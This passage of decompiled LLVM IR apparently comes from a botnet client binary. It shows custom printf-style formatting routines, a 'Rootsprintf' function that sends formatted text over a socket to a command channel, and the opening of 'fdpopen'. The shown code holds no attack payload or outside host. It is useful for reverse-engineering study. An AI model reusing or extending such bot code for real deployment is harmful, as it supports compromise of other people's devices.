  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18434.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
